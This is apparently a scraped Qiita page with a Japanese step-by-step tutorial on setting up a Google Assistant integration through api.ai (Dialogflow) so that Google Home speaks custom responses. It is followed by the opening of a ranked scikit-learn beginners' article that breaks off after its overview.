この記事を公開したちょっとあとくらいに<a href="https://blog.dialogflow.com/post/apiai-new-name-dialogflow-new-features/" rel="nofollow noopener" target="_blank">api.aiはDialogflowに変わっています</a>が、名前以外は大きく変わった点は無いはずなので、適宜読み替えてください <img alt=":bow:" class="emoji" height="20" src="https://cdn.qiita.com/emoji/twemoji/unicode/1f647.png" title=":bow:" width="20"> </p>

<hr>

<h1>
<span id="はじめに" class="fragment"></span><a href="#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB"><i class="fa fa-link"></i></a>はじめに</h1>

<p>2017年10月6日、ついに日本でGoogle Homeが発売されました。<br>
というわけで、早速買ってapi.aiのGoogle Assistant Integrationを使ってGoogle Homeに色々と言わせてみたので、簡単にやり方を紹介します。</p>

<h1>
<span id="actions-on-google" class="fragment"></span><a href="#actions-on-google"><i class="fa fa-link"></i></a>Actions on Google</h1>

<p>まずはじめに、次のURLからActions on Googleにアクセスしてプロジェクトを作成します。<br>
<a href="https://console.actions.google.com/?pli=1" class="autolink" rel="nofollow noopener" target="_blank">https://console.actions.google.com/?pli=1</a></p>

<p><a href="https://camo.qiitausercontent.com/833d8a637e20dfaee00da652d7b1b8ceec25651f/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f64383766303733342d653638662d343363642d633064362d3936356439346565616539332e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/833d8a637e20dfaee00da652d7b1b8ceec25651f/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f64383766303733342d653638662d343363642d633064362d3936356439346565616539332e706e67" width="500" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/15663/d87f0734-e68f-43cd-c0d6-965d94eeae93.png"></a></p>

<h2>
<span id="プロジェクトを作成" class="fragment"></span><a href="#%E3%83%97%E3%83%AD%E3%82%B8%E3%82%A7%E3%82%AF%E3%83%88%E3%82%92%E4%BD%9C%E6%88%90"><i class="fa fa-link"></i></a>プロジェクトを作成</h2>

<p><code>Add/import project</code>をクリックしてプロジェクトをインポートまたは新規作成します。<br>
もしGoogle API Consoleで既に別のプロジェクトがある場合は、それを選択することも可能ですが、無い場合は入力した名前で新たにプロジェクトが作成されます。<br>
入力が終わったら<code>CREATE PROJECT</code>を押しましょう。<br>
<a href="https://camo.qiitausercontent.com/a59043f523e47eaa1722908b5193df45f8e174f2/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f37316435623234632d643939632d346561372d613735332d6637623163353764326234632e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/a59043f523e47eaa1722908b5193df45f8e174f2/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f37316435623234632d643939632d346561372d613735332d6637623163353764326234632e706e67" width="500" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/15663/71d5b24c-d99c-4ea7-a753-f7b1c57d2b4c.png"></a></p>

<p>作成が完了すれば、次のような画面が表示されます。<br>
<a href="https://camo.qiitausercontent.com/0fbd9d6c1abca6911c73c5e5b0571c6db12e8b8d/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f30663636636237392d653330612d393264312d383332632d6165626663643339613662382e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/0fbd9d6c1abca6911c73c5e5b0571c6db12e8b8d/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f30663636636237392d653330612d393264312d383332632d6165626663643339613662382e706e67" width="500" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/15663/0f66cb79-e30a-92d1-832c-aebfcd39a6b8.png"></a></p>

<p>もし正常に作成されなかった場合、次のようなメッセージが表示されます。<br>
<a href="https://camo.qiitausercontent.com/c7567a7a03b933f6e85f54b6475f0fdd4ca92cd4/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f65393135373566362d626461652d343635352d663335632d3933356631626534303066382e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/c7567a7a03b933f6e85f54b6475f0fdd4ca92cd4/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f65393135373566362d626461652d343635352d663335632d3933356631626534303066382e706e67" width="500" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/15663/e91575f6-bdae-4655-f35c-935f1be400f8.png"></a></p>

<p>この場合、作成が完了したっぽメールも届きますが成功していないので、もう一回<code>CREATE PROJECT</code>を押してみてください。<br>
<a href="https://camo.qiitausercontent.com/537a6accdcbd4ffcb830f7b1cc1b66df0c732d87/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f34393165373632302d396439372d386237382d333034342d6261363633343338616538352e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/537a6accdcbd4ffcb830f7b1cc1b66df0c732d87/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f34393165373632302d396439372d386237382d333034342d6261363633343338616538352e706e67" width="500" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/15663/491e7620-9d97-8b78-3044-ba663438ae85.png"></a></p>

<p>すると、今度は成功するはずです。</p>

<h1>
<span id="apiaiを使えるようにする" class="fragment"></span><a href="#apiai%E3%82%92%E4%BD%BF%E3%81%88%E3%82%8B%E3%82%88%E3%81%86%E3%81%AB%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>api.aiを使えるようにする</h1>

<p>Actions on Googleの画面から、<code>API.AI</code>の右下にある<code>BUILD</code>をクリックします。<br>
<a href="https://camo.qiitausercontent.com/28a8f0999d361b67eb7aef5073ce51d0b76bea56/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f36303939396431632d356363622d393032332d333664392d3966646530616531363332612e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/28a8f0999d361b67eb7aef5073ce51d0b76bea56/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f36303939396431632d356363622d393032332d333664392d3966646530616531363332612e706e67" width="500" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/15663/60999d1c-5ccb-9023-36d9-9fde0ae1632a.png"></a></p>

<p>すると、次のような画面が表示されるので、<code>CREATE ACTIONS ON API.AI</code>をクリックします。<br>
<a href="https://camo.qiitausercontent.com/fc4a076b996acebaf8fb40be68d5777f42bf2e18/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f34333366386566622d663437362d303230362d646435612d3935353133613133316634332e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/fc4a076b996acebaf8fb40be68d5777f42bf2e18/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f34333366386566622d663437362d303230362d646435612d3935353133613133316634332e706e67" width="500" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/15663/433f8efb-f476-0206-dd5a-95513a131f43.png"></a></p>

<p>ウィンドウが出てきたら、Google Homeでログインしているアカウントを選択します。<br>
<a href="https://camo.qiitausercontent.com/f1f309c310409f5dbed4f4149db01fd20fabebbf/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f65383633333566632d393839632d316638382d316234662d3834623230363531306130622e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/f1f309c310409f5dbed4f4149db01fd20fabebbf/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f65383633333566632d393839632d316638382d316234662d3834623230363531306130622e706e67" width="500" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/15663/e86335fc-989c-1f88-1b4f-84b206510a0b.png"></a></p>

<p>アクセスを許可します。<br>
<a href="https://camo.qiitausercontent.com/705ddec1bb9b78675d1c30881152caed11220b83/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f36366638366161382d643265372d393935392d393230342d3735656261653237353963612e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/705ddec1bb9b78675d1c30881152caed11220b83/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f36366638366161382d643265372d393935392d393230342d3735656261653237353963612e706e67" width="500" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/15663/66f86aa8-d2e7-9959-9204-75ebae2759ca.png"></a></p>

<p>また別の権限を求められるので右下の「AUTHORIZE」をクリックします。<br>
<a href="https://camo.qiitausercontent.com/112dc9e7796506784a869783ebcfca4c8f02aaa3/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f66336362316538332d373633392d616465612d316534352d3533373530613835376231662e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/112dc9e7796506784a869783ebcfca4c8f02aaa3/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f66336362316538332d373633392d616465612d316534352d3533373530613835376231662e706e67" width="500" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/15663/f3cb1e83-7639-adea-1e45-53750a857b1f.png"></a></p>

<p>これもGoogle Homeでログインしているのと同じアカウントを選択します。<br>
<a href="https://camo.qiitausercontent.com/f1f309c310409f5dbed4f4149db01fd20fabebbf/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f65383633333566632d393839632d316638382d316234662d3834623230363531306130622e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/f1f309c310409f5dbed4f4149db01fd20fabebbf/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f65383633333566632d393839632d316638382d316234662d3834623230363531306130622e706e67" width="500" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/15663/e86335fc-989c-1f88-1b4f-84b206510a0b.png"></a></p>

<p>アクセスを許可します。<br>
<a href="https://camo.qiitausercontent.com/fd143fe0212ff31644a38a1538f9afe9e2c224df/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f30326230323965342d373664332d353531622d666233382d3662626633343635636539382e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/fd143fe0212ff31644a38a1538f9afe9e2c224df/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f30326230323965342d373664332d353531622d666233382d3662626633343635636539382e706e67" width="500" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/15663/02b029e4-76d3-551b-fb38-6bbf3465ce98.png"></a></p>

<p>次のような画面が出てくるので、説明や言語設定を変えて右上の「SAVE」をクリックします。<br>
<a href="https://camo.qiitausercontent.com/fb7e4a1563d4be9e70ec2f3d5cff1ecba6d6bfe9/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f36386631356265332d353533332d373966622d656334642d6165323766396633313863352e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/fb7e4a1563d4be9e70ec2f3d5cff1ecba6d6bfe9/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f36386631356265332d353533332d373966622d656334642d6165323766396633313863352e706e67" width="500" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/15663/68f15be3-5533-79fb-ec4d-ae27f9f318c5.png"></a></p>

<p>これでapi.aiを使う準備ができました。<br>
<a href="https://camo.qiitausercontent.com/41ac3d7335d83a5ea9686513b154e7558dc4127a/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f36633634643062612d356237342d383261612d333437372d3863373234616462643732352e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/41ac3d7335d83a5ea9686513b154e7558dc4127a/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f36633634643062612d356237342d383261612d333437372d3863373234616462643732352e706e67" width="500" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/15663/6c64d0ba-5b74-82aa-3477-8c724adbd725.png"></a></p>

<h2>
<span id="apiaiにintentを追加する" class="fragment"></span><a href="#apiai%E3%81%ABintent%E3%82%92%E8%BF%BD%E5%8A%A0%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>api.aiにIntentを追加する</h2>

<p>api.aiの画面の<code>Intents</code>の少し左にある「＋」ボタンを押すと、次のようにIntentを追加する画面が出てきます。<br>
<code>User says</code>の部分に何を言ったら反応するかを入力し、<code>Text response</code>の部分に返す言葉を入力します。<br>
<a href="https://camo.qiitausercontent.com/c061bb803615d7a9aa1a07a357a3a330f8efc843/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f63333332303161632d363932652d363931642d373934372d3966373933363034343538652e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/c061bb803615d7a9aa1a07a357a3a330f8efc843/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f63333332303161632d363932652d363931642d373934372d3966373933363034343538652e706e67" width="500" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/15663/c33201ac-692e-691d-7947-9f793604458e.png"></a></p>

<p><code>Text response</code>に複数入力すれば、その中からランダムに1つを選んで言葉を返してくれます。<br>
入力が終わったら、右上の<code>SAVE</code>ボタンを押しましょう。</p>

<h2>
<span id="google-assistantのintegrationを設定する" class="fragment"></span><a href="#google-assistant%E3%81%AEintegration%E3%82%92%E8%A8%AD%E5%AE%9A%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>Google AssistantのIntegrationを設定する</h2>

<p>左のメニューから<code>Integrations</code>をクリックし、出てきた画面の<code>Google Assistant</code>をオンにして<code>SETTINGS</code>を押します。<br>
<a href="https://camo.qiitausercontent.com/28a9cd653bad9ed863e57cb5015579a638a62c6b/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f38333636393362332d383736302d656336332d633030392d3832666362386231613832662e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/28a9cd653bad9ed863e57cb5015579a638a62c6b/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f38333636393362332d383736302d656336332d633030392d3832666362386231613832662e706e67" width="500" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/15663/836693b3-8760-ec63-c009-82fcb8b1a82f.png"></a></p>

<p>設定ダイアログが出てくるので、右下の<code>AUTHORIZE</code>を押します。<br>
<a href="https://camo.qiitausercontent.com/97d4cb934249ce190e9b6a00cfd5bf8eccca5f95/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f34396334343633342d346333642d313632352d366436342d3638396336663533336339652e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/97d4cb934249ce190e9b6a00cfd5bf8eccca5f95/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f34396334343633342d346333642d313632352d366436342d3638396336663533336339652e706e67" width="500" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/15663/49c44634-4c3d-1625-6d64-689c6f533c9e.png"></a></p>

<p>アカウントを選択します。<br>
<a href="https://camo.qiitausercontent.com/868e0cb491dfe21501fd537f485570429797bcd6/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f35623036383838382d646136382d393163362d353137662d3866653061316530383937642e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/868e0cb491dfe21501fd537f485570429797bcd6/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f35623036383838382d646136382d393163362d353137662d3866653061316530383937642e706e67" width="500" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/15663/5b068888-da68-91c6-517f-8fe0a1e0897d.png"></a></p>

<p>許可します。<br>
<a href="https://camo.qiitausercontent.com/1f438d680d5780f4cc75d0afb958587fc1afe278/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f39376433393435392d626562632d323134322d633063662d3061643134323263646565312e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/1f438d680d5780f4cc75d0afb958587fc1afe278/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f39376433393435392d626562632d323134322d633063662d3061643134323263646565312e706e67" width="500" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/15663/97d39459-bebc-2142-c0cf-0ad1422cdee1.png"></a></p>

<p>右下が<code>UPDATE DRAFT</code>に変わりました。<br>
この画面から、Google AssistantにIntentを設定します。<br>
<a href="https://camo.qiitausercontent.com/a575c829113d77f040beae16bd6ad2c7db06b82c/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f38353237633839382d623332632d623338632d643837352d3865316363313661373233342e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/a575c829113d77f040beae16bd6ad2c7db06b82c/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f38353237633839382d623332632d623338632d643837352d3865316363313661373233342e706e67" width="500" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/15663/8527c898-b32c-b38c-d875-8e1cc16a7234.png"></a></p>

<p><code>Welcome Intent</code>は<code>Google Assistant Integration</code>を起動したときに最初に動作するIntentです。<br>
デフォルトであれば、「こんにちは」と言います。<br>
先ほど作成したIntentを追加する場合は、<code>Additional triggering intents</code>の下にある<code>Select intent</code>から作成したIntentを選んで追加します。<br>
<a href="https://camo.qiitausercontent.com/f051dbcc168dfd7638a0bec5a50fdb809d080946/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f61366563353639612d313066382d643265662d626538312d3964303661396436313435642e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/f051dbcc168dfd7638a0bec5a50fdb809d080946/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f61366563353639612d313066382d643265662d626538312d3964303661396436313435642e706e67" width="500" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/15663/a6ec569a-10f8-d2ef-be81-9d06a9d6145d.png"></a></p>

<p>設定が終わったら<code>UPDATE DRAFT</code>を押して設定を更新します。<br>
更新が完了すると、次のような画面になるので、<code>VISIT CONSOLE</code>を押してコンソール画面に遷移します。<br>
<a href="https://camo.qiitausercontent.com/22aafb592357d4f169ac39bf6860fbd389f02225/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f32633137343261332d363765652d396434382d626539362d3263333764393163646562612e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/22aafb592357d4f169ac39bf6860fbd389f02225/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f32633137343261332d363765652d396434382d626539362d3263333764393163646562612e706e67" width="500" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/15663/2c1742a3-67ee-9d48-be96-2c37d91cdeba.png"></a></p>

<h1>
<span id="integrationをテストする" class="fragment"></span><a href="#integration%E3%82%92%E3%83%86%E3%82%B9%E3%83%88%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>Integrationをテストする</h1>

<h2>
<span id="simulatorの場合" class="fragment"></span><a href="#simulator%E3%81%AE%E5%A0%B4%E5%90%88"><i class="fa fa-link"></i></a>Simulatorの場合</h2>

<p>Actions on Googleのコンソール画面の左側にある<code>Simulator</code>を押します。<br>
これがGoogle Assistantのシミュレーターです。<br>
<a href="https://camo.qiitausercontent.com/d0ae7730fe8876da7eb05641eea38450740f97d6/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f30323665356631612d633137652d363235612d373264332d3632613961393762316537652e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/d0ae7730fe8876da7eb05641eea38450740f97d6/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f30323665356631612d633137652d363235612d373264332d3632613961393762316537652e706e67" width="500" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/15663/026e5f1a-c17e-625a-72d3-62a9a97b1e7e.png"></a></p>

<p>先ほど作成したIntegrationを使うには、自分が作成したアプリに繋がなければいけません。<br>
デフォルトでは、「テスト用アプリにつないで」と言うと、起動できます。<br>
まずは「テスト用アプリにつないで」とチャットしてみましょう。<br>
<a href="https://camo.qiitausercontent.com/43974b19f4da5277f0fa62d7a915ab4cf9b87952/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f32623832383135662d373061302d313462352d666364642d6531346639383532353866382e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/43974b19f4da5277f0fa62d7a915ab4cf9b87952/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f32623832383135662d373061302d313462352d666364642d6531346639383532353866382e706e67" width="500" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/15663/2b82815f-70a0-14b5-fcdd-e14f985258f8.png"></a></p>

<p>Welcome intentが動作したのがわかります。<br>
では、先ほど自分が作成したintentを動作させてみましょう。<br>
<a href="https://camo.qiitausercontent.com/0b9e7a30d52c55e7a2864c434c1f9af34538fb1b/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f61396532356161632d653039332d363139312d363164622d3565313863353839316461652e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/0b9e7a30d52c55e7a2864c434c1f9af34538fb1b/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f61396532356161632d653039332d363139312d363164622d3565313863353839316461652e706e67" width="500" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/15663/a9e25aac-e093-6191-61db-5e18c5891dae.png"></a></p>

<p>意図したとおりの結果が返ってきましたね。成功です！</p>

<h1>
<span id="google-homeの実機の場合" class="fragment"></span><a href="#google-home%E3%81%AE%E5%AE%9F%E6%A9%9F%E3%81%AE%E5%A0%B4%E5%90%88"><i class="fa fa-link"></i></a>Google Homeの実機の場合</h1>

<p>Google Homeの実機で、Integrationを作成したGoogleアカウントと同じアカウントでログインされていれば、Simulatorと同じようにテスト用アプリを起動できます。<br>
デモ動画にしてみましたので、よろしければご覧ください（画像をクリックするとYouTubeに飛びます）。<br>
<a href="https://www.youtube.com/watch?v=7T8GCzwgPI0" rel="nofollow noopener" target="_blank"><br>
<img src="https://camo.qiitausercontent.com/a625cdc316214fccbe4bdddee2f4fcc5367b1f2c/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f64626665666331662d333938392d633665362d363631302d6461393137636234306136612e6a706567" width="500" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/15663/dbfefc1f-3989-c6e6-6610-da917cb40a6a.jpeg"><br>
</a></p>

<p>実機でも、意図したとおりの結果が返ってきました！</p>

<h1>
<span id="公開したい場合" class="fragment"></span><a href="#%E5%85%AC%E9%96%8B%E3%81%97%E3%81%9F%E3%81%84%E5%A0%B4%E5%90%88"><i class="fa fa-link"></i></a>公開したい場合</h1>

<p>もし作成したActionを公開したい場合、<code>Actions on Google</code>の左側にある<code>Overview</code>を押し、アプリの情報を入力して右下の<code>SUBMIT DRAFT FOR REVIEW</code>を押せばGoogleの審査の後、問題なければ公開できると思われます。<br>
<a href="https://camo.qiitausercontent.com/77ef21dddb95497e4af87e17d95b7b4a25e937ec/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f36316235383636382d363532632d383439322d636137362d3464636362396230616264322e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/77ef21dddb95497e4af87e17d95b7b4a25e937ec/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f31353636332f36316235383636382d363532632d383439322d636137362d3464636362396230616264322e706e67" width="500" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/15663/61b58668-652c-8492-ca76-4dccb9b0abd2.png"></a></p>

<p>詳しくはこちらをどうぞ。<br>
<a href="https://developers.google.com/actions/console/publishing" class="autolink" rel="nofollow noopener" target="_blank">https://developers.google.com/actions/console/publishing</a></p>

<h1>
<span id="おわりに" class="fragment"></span><a href="#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB"><i class="fa fa-link"></i></a>おわりに</h1>

<p>今回は、api.aiを利用したGoogle Assistant Integrationの簡単な作り方を紹介しました。<br>
他にもさまざまなことをさせることができるので、ぜひ色々試してみてください！</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">87位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>107</kbd>
		<a target="_blank" href="https://qiita.com/sugulu/items/e3fc39f2e552f2355209">【機械学習初心者向け】scikit-learn「アルゴリズム・チートシート」の全手法を実装・解説してみた</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-09-23<br />07:44:02</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/191401.html">sugulu</a>(11件の記事)<br />(都内IT企業 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/191401/profile-images/1509357969">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[Python]</b> <b>[機械学習]</b> <b>[scikit-learn]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>scikit-learnのアルゴリズム・チートシートで紹介されている手法を全て実装し、解説してみました。</p>

<h1>
<span id="概要" class="fragment"></span><a href="#%E6%A6%82%E8%A6%81"><i class="fa fa-link"></i></a>概要</h1>

<p><a href="https://camo.qiitausercontent.com/475abe0d01d9ed0026e5d3f21989910a2aeeb3ce/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f33643435303838642d643965612d373539392d623139322d6539343762653734663830382e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/475abe0d01d9ed0026e5d3f21989910a2aeeb3ce/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f33643435303838642d643965612d373539392d623139322d6539343762653734663830382e706e67" alt="slcsheet.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/191401/3d45088d-d9ea-7599-b192-e947be74f808.png"></a></p>

<p><a href="http://scikit-learn.org/stable/tutorial/machine_learning_map/" rel="nofollow noopener" target="_blank">scikit-learn アルゴリズム・チートシート</a></p>

<p>【対象者】機械学習を使用したい方、初心者向けの機械学習本を読んで少し実装してみた方<br>
scikit-learnの説明は英語で分かりにくいし、実装例もシンプルでなくて、よく分からんという方</p>

<p>【得られるもの】模擬データを用いて、各手法を使用したミニマム・シンプルなプログラムが実装できるようになります。<br>
アルゴリズムの詳細な数式は理解できませんが、だいたい何をやりたいのか、意図と心、エッセンスが分かります。</p>

<p>アルゴリズムマップの手法をひとつずつ実装・解説します。<br>
コード全部載せるのは大変なので、各内容の詳細はブログに掲載しております。</p>

<p>詳細な数式を掲載しているのではなく、初学者がエッセンスをつかめるような説明を目指して記事を執筆しました。</p>

<h1>
<span id="クラス分類問題教師あり学習" class="fragment"></span><a href="#%E3%82%AF%E3%83%A9%E3%82%B9%E5%88%86%E9%A1%9E%E5%95%8F%E9%A1%8C%E6%95%99%E5%B8%AB%E3%81%82%E3%82%8A%E5%AD%A6%E7%BF%92"><i class="fa fa-link"></i></a>クラス分類問題・教師あり学習</h1>

